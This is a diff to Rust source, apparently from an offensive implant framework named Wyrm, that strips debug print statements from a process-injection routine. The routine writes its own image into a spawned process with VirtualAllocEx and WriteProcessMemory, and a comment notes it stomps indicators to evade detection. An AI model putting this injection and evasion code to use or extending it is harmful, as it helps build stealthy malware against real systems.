@@ -78,19 +78,6 @@ pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
         return WyrmResult::Err::<String>(msg);
     }
 
-    let pid = unsafe { GetProcessId(pi.hProcess) };
-    if pid == 0 {
-        println!("Handle was invalid");
-        return WyrmResult::Err(unsafe { GetLastError() }.to_string());
-    }
-
-    println!(
-        "hProcess = 0x{:X}, hThread = 0x{:X}, pid={}",
-        pi.hProcess as usize,
-        pi.hThread as usize,
-        unsafe { GetProcessId(pi.hProcess) }
-    );
-
     //
     // Allocate the memory + copy our process image in (stomping some indicators in the process of)
     //
@@ -250,13 +237,8 @@ fn calculate_memory_delta(buf_start_address: usize, fn_ptr_address: usize) -> Op
 /// produced from calling `GetLastError`
 fn write_image_rw(h_process: HANDLE, buf: &mut Vec<u8>) -> Result<*const c_void, u32> {
     let pid = unsafe { GetProcessId(h_process) };
-    println!(
-        "[write_image_rw] h_process=0x{:X} pid={}",
-        h_process as usize, pid
-    );
     if pid == 0 {
         let gle = unsafe { GetLastError() };
-        println!("[write_image_rw] GetProcessId failed gle=0x{:X}", gle);
         return Err(gle);
     }
 
@@ -271,7 +253,6 @@ fn write_image_rw(h_process: HANDLE, buf: &mut Vec<u8>) -> Result<*const c_void,
     };
 
     if p_alloc.is_null() {
-        println!("{}", sc!("Failed to run VirtualAllocEx", 97).unwrap());
         return Err(unsafe { GetLastError() });
     }
 
@@ -289,7 +270,6 @@ fn write_image_rw(h_process: HANDLE, buf: &mut Vec<u8>) -> Result<*const c_void,
         unsafe { WriteProcessMemory(h_process, p_alloc, buf.as_ptr() as _, buf.len(), null_mut()) };
 
     if res == 0 {
-        println!("{}", sc!("Failed to run WriteProcessMemory", 97).unwrap());
         return Err(unsafe { GetLastError() });
     }
 
